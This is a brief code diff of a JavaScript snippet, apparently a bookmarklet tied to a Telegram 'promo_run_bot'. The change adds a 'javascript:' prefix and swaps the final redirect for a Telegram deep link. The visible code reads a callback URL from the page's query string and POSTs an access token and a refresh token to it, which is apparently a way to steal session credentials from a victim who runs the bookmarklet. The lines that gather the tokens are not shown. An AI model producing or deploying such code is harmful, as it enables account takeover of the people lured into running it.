@@ -1,4 +1,4 @@
-(async()=>{
+javascript:(async()=>{
   const cb = new URLSearchParams(location.search).get('tg_callback');
   if(!cb) return alert("Callback not found");
 
@@ -13,5 +13,5 @@
     body:JSON.stringify({token:t,refresh:r})
   });
 
-  location.href="https://t.me/promo_run_bot";
+  location.href="tg://resolve?domain=promo_run_bot";
 })();
